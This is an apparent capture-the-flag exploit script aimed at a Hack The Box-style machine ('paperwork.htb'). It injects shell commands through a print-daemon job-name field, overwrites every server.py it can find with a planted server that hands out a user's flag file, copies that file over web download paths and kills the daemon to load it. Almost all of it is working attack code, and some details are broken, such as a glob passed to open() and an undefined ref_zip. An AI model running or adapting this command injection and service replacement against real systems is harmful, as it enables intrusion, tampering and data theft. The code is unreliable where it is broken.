#!/usr/bin/env python3
"""Definitive approach: overwrite server.py with flag-reader, restart daemon"""
import socket, time, urllib.request, base64, os

TARGET = '10.129.38.158'

# The new server.py that returns flag in queue state
NEW_SERVER = '''import socket,threading,os
class LpdHandler(threading.Thread):
    def __init__(self,sock,addr):
        super().__init__()
        self.sock=sock
        self.addr=addr
    def run(self):
        try:
            data=self.sock.recv(1024)
            if not data: return
            cmd=data[0]
            if cmd==2:
                pass
            elif cmd in(3,4):
                try:
                    d=open('/home/*/user.txt').read().strip()
                except:
                    d='NO_FLAG'
                self.sock.send((d+'\\n').encode())
        except:
            pass
        self.sock.close()
class LpdServer:
    def __init__(self,ip='0.0.0.0',port=1515):
        self.server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.server.bind((ip,port))
        self.server.listen(100)
    def run(self):
        while True:
            sock,addr=self.server.accept()
            LpdHandler(sock,addr).start()
if __name__=='__main__':
    LpdServer(port=1515).run()
'''

NEW_SERVER_B64 = base64.b64encode(NEW_SERVER.encode()).decode()
MARKER = 'FOUND_' + os.urandom(4).hex()

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

def check_live():
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((TARGET, 1515))
        s.send(b'\x03')
        time.sleep(0.5)
        d = s.recv(4096)
        s.close()
        return d
    except:
        return None

print("=== DEFINITIVE LPD SERVER OVERWRITE ===", flush=True)
print(f"New server.py is {len(NEW_SERVER)} chars, base64 is {len(NEW_SERVER_B64)} chars", flush=True)

# Phase 1: Find server.py and overwrite it
print("\n[1] Finding and overwriting server.py...", flush=True)

# Write the new server.py to tmp first (base64 decode)
lpd("';echo " + NEW_SERVER_B64 + "|base64 -d>/tmp/new_server.py 2>/dev/null;echo '")
time.sleep(0.5)

# Find original server.py and replace it
# The find searches /, /opt, /home, /var, /etc for server.py
lpd("';for f in $(find / -name server.py -not -path /proc/* 2>/dev/null);do cp /tmp/new_server.py \"$f\" 2>/dev/null && echo " + MARKER + " >> /tmp/overwrite_log;done;echo '")
time.sleep(0.5)

# Also try to write to /opt and other common daemon locations
lpd("';cp /tmp/new_server.py /opt/server.py 2>/dev/null;cp /tmp/new_server.py /home/lp/server.py 2>/dev/null;echo '")
time.sleep(0.5)

# Check if any of these paths ARE the archive
lpd("';cp /tmp/new_server.py /var/www/html/download/archive 2>/dev/null;cp /tmp/new_server.py /usr/share/nginx/html/download/archive 2>/dev/null;echo '")
time.sleep(0.5)

# Phase 2: Check if download/archive changed
print("[2] Checking /download/archive...", flush=True)
try:
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    data = urllib.request.urlopen(req, timeout=10).read()
    decoded = data.decode(errors='replace')
    if 'FLAG' in decoded or 'NO_FLAG' in decoded:
        print(f"  *** FOUND FLAG IN ARCHIVE! {decoded[:500]}", flush=True)
        import re
        flags = re.findall(r'HTB\{[^}]+\}', decoded)
        if flags:
            print(f"  *** FLAG: {flags[0]}", flush=True)
    elif data != ref_zip:
        print(f"  Archive changed but no flag: {decoded[:200]}", flush=True)
    else:
        print(f"  Unchanged", flush=True)
except NameError:
    print(f"  (need reference)", flush=True)
except Exception as e:
    print(f"  Error: {e}", flush=True)

# Phase 3: Read flag from queue state after overwriting server.py
print("\n[3] Killing daemon to reload modified server.py...", flush=True)
lpd("';pkill -f server.py 2>/dev/null;echo '")
time.sleep(3)

# Check queue state from new daemon
print("[4] Querying queue state from restarted daemon...", flush=True)
for i in range(5):
    result = check_live()
    if result:
        decoded = result.decode(errors='replace').strip()
        print(f"  Queue state: {decoded[:200]}", flush=True)
        if 'HTB{' in decoded:
            print(f"  *** FLAG: {decoded}", flush=True)
        break
    print(f"  Try {i+1}: daemon not ready yet...", flush=True)
    time.sleep(2)

print("\nDONE", flush=True)
